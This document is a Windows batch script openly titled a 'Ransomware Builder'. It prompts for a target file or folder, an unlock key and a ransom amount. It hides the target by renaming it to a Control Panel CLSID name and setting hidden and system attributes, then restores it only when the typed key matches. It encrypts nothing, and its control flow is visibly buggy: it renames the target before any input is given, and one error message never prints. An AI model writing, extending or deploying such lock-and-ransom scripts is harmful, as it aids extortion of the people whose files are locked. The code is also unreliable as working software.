cls
@echo off
title Ransomware Builder in CMD prompt
ren %userInput2% "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
attrib +h +s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
if EXIST "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" goto INTRO
:INTRO
echo =======================================================================================================================
echo                    v1.2                      Coded by Jaxon Lackey                          Works for all windows
echo======================================================================================================================
echo Loading.........
echo Loaded!
goto Building
:Building
set /p userInput=Name for Ransomware:
echo ===================================================%userInput%=========================================================
goto SELFILE
:SELFILE
set /p userInput2=Target Encrypted File: 
echo %userInput2%
goto SETKEY
:SETKEY
echo Set key for ransomware
set /p userInput3=Type key: 
echo %userInput3%
goto RANAMT
:RANAMT
set /p userInput4=Type ransom amount: 
echo %userInput4%
goto NAME
:NAME
set /p userInput5=Type name:
title %userInput5%
goto finished
:finished
echo =======================================================%userInput%===================================================
ren %userInput2% "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
attrib +h +s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
echo ======================RANSOM AMOUNT: %userInput4%
echo ============================INPUT KEY:
set/p "pass=>"
if NOT %pass%==%userInput3% goto fail
echo =======================%userInput%===============================
echo UNLOCKED FOLDER SUCCESSFULLY
attrib -h -s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
ren "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" %userInput2%
:fail echo Invalid or expired key.
goto end
:end

